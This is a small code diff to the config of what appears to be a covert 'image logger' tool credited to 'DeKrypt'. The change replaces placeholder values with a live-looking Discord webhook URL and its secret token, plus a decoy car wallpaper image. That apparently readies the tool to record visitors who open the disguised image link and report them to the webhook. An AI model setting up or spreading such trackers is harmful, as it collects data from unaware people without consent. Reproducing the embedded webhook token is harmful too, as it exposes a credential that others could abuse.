@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1341303639729377290/ojXUFLGVsHKQ3JlvVcGnJ5UmgZuDNSMr4fWfzgbtbzY_MITqUXQvKFsfNdQ2fY5S8C-Z",
+    "image": "https://w7.pngwing.com/pngs/303/833/png-transparent-2018-nissan-370z-car-nissan-juke-2019-nissan-370z-nismo-nissan-gtr-computer-wallpaper-car-performance-car.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
